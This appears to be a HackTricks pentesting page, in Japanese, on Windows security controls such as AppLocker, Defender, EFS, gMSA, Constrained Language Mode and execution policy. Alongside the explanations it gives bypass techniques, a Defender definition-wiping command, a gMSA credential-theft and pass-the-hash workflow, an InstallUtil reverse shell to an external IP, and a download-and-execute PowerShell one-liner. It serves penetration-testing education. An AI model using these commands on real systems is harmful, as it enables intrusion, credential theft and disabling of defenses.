# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker ポリシー

アプリケーションのホワイトリストは、システム上に存在し、実行することが許可された承認済みソフトウェアアプリケーションまたは実行ファイルの一覧です。その目的は、組織固有の業務ニーズに適合しない有害な malware や未承認ソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の**アプリケーションホワイトリストソリューション**であり、システム管理者が**ユーザーによる実行を許可するアプリケーションやファイルを制御**できるようにします。実行ファイル、スクリプト、Windows インストーラーファイル、DLL、パッケージ化されたアプリ、パッケージ化されたアプリインストーラーを**きめ細かく制御**できます。\
組織では通常、**cmd.exe と PowerShell.exe**、および特定のディレクトリへの書き込みアクセスを**ブロックしますが、これらはすべて bypass できます**。

### Check

ブラックリストまたはホワイトリストに登録されているファイルや拡張子を確認します。
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリパスには、AppLocker によって適用される設定とポリシーが含まれており、システム上で現在適用されているルールセットを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するために役立つ **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` 内の任意のものの実行を許可している場合、これを **bypass** するために利用できる **writable folders** があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に**信頼されている** [**「LOLBAS」**](https://lolbas-project.github.io/) バイナリも、AppLocker の bypass に利用できます。
- **不適切に記述されたルールも bypass できる可能性があります**
- 例えば **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、どこにでも **`allowed` という名前のフォルダーを作成**でき、そのフォルダーは許可されます。
- 組織は `%System32%\WindowsPowerShell\v1.0\powershell.exe` 実行ファイルの**ブロックに注力しがち**ですが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` など、その他の [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を忘れてしまうことがあります。
- **DLL enforcement が有効化されることは非常にまれ**です。これは、システムに追加の負荷がかかる可能性があり、何も壊れないことを確認するために多くのテストが必要になるためです。そのため、**DLL を backdoor として使用すると AppLocker の bypass に役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセスで **PowerShell** code を**実行**し、AppLocker を bypass できます。詳しくは、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

ローカル credentials はこのファイルに存在し、passwords は hash 化されています。

### Local Security Authority (LSA) - LSASS

Single Sign-On のため、この subsystem の**memory**内に**credentials**（hashed）が**保存**されます。\
**LSA** はローカルの **security policy**（password policy、users permissions など）、**authentication**、**access tokens** などを管理します。\
LSA は、（ローカル login の場合）提供された credentials を **SAM** file 内で**確認**し、domain user を authenticate するために **domain controller** と**通信**します。

**Credentials** は **process LSASS** 内に**保存**されます。Kerberos tickets、NT および LM hashes、簡単に復号できる passwords などです。

### LSA secrets

LSA は一部の credentials を disk に保存することがあります。

- Active Directory の computer account の password（到達不能な domain controller）。
- Windows services の accounts の passwords
- scheduled tasks の passwords
- その他（IIS applications の password など）

### NTDS.dit

Active Directory の database です。Domain Controllers にのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は、Windows 10、Windows 11、および Windows Server の各バージョンで利用できる Antivirus です。**`WinPEAS`** などの一般的な pentesting tools を**ブロック**します。ただし、これらの**保護を bypass する方法**があります。

### Check

**Defender** の**status**を確認するには、PS cmdlet **`Get-MpComputerStatus`** を実行します（有効かどうかを確認するには **`RealTimeProtectionEnabled`** の値を確認します）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

enumerate するには、次のコマンドも実行できます。
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFSは、**File Encryption Key (FEK)** と呼ばれる**対称鍵**を使用して、暗号化によってファイルを保護します。この鍵はユーザーの**公開鍵**で暗号化され、暗号化されたファイルの $EFS **alternative data stream** 内に保存されます。復号が必要な場合、ユーザーのデジタル証明書に対応する**秘密鍵**を使用して、$EFS stream からFEKを復号します。詳細については[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしで行われる復号のシナリオ**には、次のものがあります。

- ファイルまたはフォルダーが[FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)のようなEFSに対応していないファイルシステムに移動されると、自動的に復号されます。
- SMB/CIFSプロトコル経由でネットワーク上に送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式により、所有者は暗号化されたファイルに**透過的にアクセス**できます。ただし、所有者のパスワードを変更してログインするだけでは、復号できません。

**重要なポイント**:

- EFSは、ユーザーの公開鍵で暗号化された対称FEKを使用します。
- 復号では、ユーザーの秘密鍵を使用してFEKにアクセスします。
- FAT32へのコピーやネットワーク経由の送信など、特定の条件下では自動的に復号されます。
- 暗号化されたファイルには、所有者が追加操作なしでアクセスできます。

### EFS infoの確認

**user**がこの**service**を**使用した**ことがあるかどうかを、次のパスが存在するか確認して調べます:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\ を使用して、ファイルに**アクセス**できる**ユーザー**を確認します\
フォルダー内で `cipher /e` と `cipher /d` を使用して、すべてのファイルを**暗号化**および**復号**することもできます

### EFSファイルの復号

#### Authority Systemになる

この方法では、ホスト内で**victim user**が**process**を**実行している**必要があります。その場合、`meterpreter` sessionsを使用して、ユーザーのprocessのtokenを偽装できます（`incognito`の`impersonate_token`）。または、ユーザーのprocessへ`migrate`することもできます。

#### ユーザーのパスワードを知っている場合

Mimikatzには、ユーザーのcertificate/private key materialをimportし、パスワードが既知の場合にEFSで保護されたファイルを復号する方法が記載されています。<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoftは、ITインフラストラクチャにおけるservice accountsの管理を簡素化するために、**Group Managed Service Accounts (gMSA)**を開発しました。従来のservice accountsでは、通常 "**Password never expire**" 設定が有効になっていますが、gMSAはより安全で管理しやすいソリューションを提供します。

- **Automatic Password Management**: gMSAは、domainまたはcomputer policyに従って自動的に変更される、240文字の複雑なパスワードを使用します。この処理はMicrosoftのKey Distribution Service (KDC)によって行われるため、手動でパスワードを更新する必要がありません。
- **Enhanced Security**: これらのアカウントはlockoutの影響を受けず、interactive loginにも使用できないため、securityが向上します。
- **Multiple Host Support**: gMSAは複数のhostで共有できるため、複数のserver上で実行されるserviceに適しています。
- **Scheduled Task Capability**: managed service accountsとは異なり、gMSAはscheduled tasksの実行をサポートします。
- **Simplified SPN Management**: computerのsAMaccount detailsまたはDNS nameに変更があると、systemがService Principal Name (SPN)を自動的に更新するため、SPN managementが簡素化されます。

gMSAのパスワードはLDAP property _**msDS-ManagedPassword**_ に保存され、Domain Controllers (DCs)によって30日ごとに自動的にresetされます。このパスワードは、[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化されたdata blobであり、authorized administratorsと、gMSAがinstallされているserverのみが取得できます。これにより、安全な環境が確保されます。この情報にアクセスするには、LDAPSなどのsecured connectionが必要です。または、connectionを 'Sealing & Secure' でauthenticatedする必要があります。

![gMSA passwordを取得するためのNTLM authenticationのRelaying](../../images/asd1.png)<sup>[[1]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**を使用して、このパスワードを読み取ることができます。<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**アーカイブされた元の研究で詳細を確認**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)。<sup>[[1]](#references)</sup>

同じ研究では、リレーされた principal に `msDS-ManagedPassword` の読み取り権限がある場合、**NTLM relay attack** によって **gMSA password** を取得する方法が説明されています。<sup>[[1]](#references)</sup>

### ACL chaining を悪用して gMSA managed password を読み取る (GenericAll -> ReadGMSAPassword)

多くの環境では、設定ミスのある object ACL を悪用することで、DC compromise なしに、低権限ユーザーから gMSA secrets へ pivot できます。<sup>[[3]](#references)</sup>

- 自分が control できる group（例: GenericAll/GenericWrite 経由）に、gMSA に対する `ReadGMSAPassword` が付与されている。
- その group に自分を追加すると、LDAP 経由で gMSA の `msDS-ManagedPassword` blob を読み取り、使用可能な NTLM credentials を導出する権限を継承できます。

Typical workflow:

1) BloodHound で path を発見し、自分の foothold principals を Owned として mark します。次のような edges を探します:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 自分が control する intermediate group に自分を追加します（bloodyAD を使用した例）:
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP 経由で gMSA の管理パスワードを読み取り、NTLM hash を導出します。NetExec は `msDS-ManagedPassword` の抽出と NTLM への変換を自動化します：
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hashを使用してgMSAとして認証します（平文は不要です）。アカウントがRemote Management Usersに含まれている場合、WinRMは直接動作します：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
注:
- `msDS-ManagedPassword` の LDAP 読み取りには sealing（例: LDAPS/sign+seal）が必要です。Tools がこれを自動的に処理します。
- gMSA には、WinRM などのローカル権限が付与されていることがよくあります。横展開を計画するため、グループメンバーシップ（例: Remote Management Users）を確認してください。
- blob を取得して NTLM を自分で計算するだけでよい場合は、MSDS-MANAGEDPASSWORD_BLOB structure を参照してください。



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) からダウンロードできる **Local Administrator Password Solution (LAPS)** は、ローカル Administrator パスワードの管理を可能にします。これらのパスワードは **randomized** され、一意で、**定期的に変更**され、Active Directory に一元的に保存されます。これらのパスワードへのアクセスは、ACL によって authorized users に制限されています。十分な権限が付与されると、local admin パスワードを読み取れるようになります。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は、PowerShell を効果的に使用するために必要な多くの機能を **ロックダウン** します。これには、COM objects のブロック、承認された .NET types のみの許可、XAML-based workflows、PowerShell classes などが含まれます。

### **チェック**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
現在の Windows バージョンではその bypass はもう機能しませんが、[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\
**コンパイルするには** **参照の追加** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更する**必要がある場合があります。

#### 直接 bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセスで **Powershell** コードを **execute** し、constrained mode を bypass できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[4]](#references)</sup>

## PS Execution Policy

デフォルトでは **restricted** に設定されています。この policy を bypass する主な方法は次のとおりです。
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細については[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>をご覧ください。

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用できるAPIです。

SSPIは、通信する2台のマシンに適した認証プロトコルを選択し、利用可能な場合はKerberosを優先します。これらのプロトコルはSecurity Support Provider (SSP)によって実装されており、Windows上ではDLLとしてインストールされています。ネゴシエートされたproviderは、双方のpeerがサポートしている必要があります。

### Main SSPs

- **Kerberos**: 優先されるもの
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** および **NTLMv2**: 互換性上の理由
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: WebサーバーおよびLDAPで使用され、パスワードはMD5 hash形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSLおよびTLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルのネゴシエーションに使用される（KerberosまたはNTLM。デフォルトはKerberos）
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数のmethod、または1つだけのmethodが提示される場合があります。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**権限昇格を伴うアクティビティに対する同意プロンプト**を表示する機能です。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSAのrelay – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: 権限のchainによるWinRM経由のgMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLockerおよびPowerShell Constrained Language Modeのbypass](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policyをbypassする15の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFSファイルをdecryptする](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
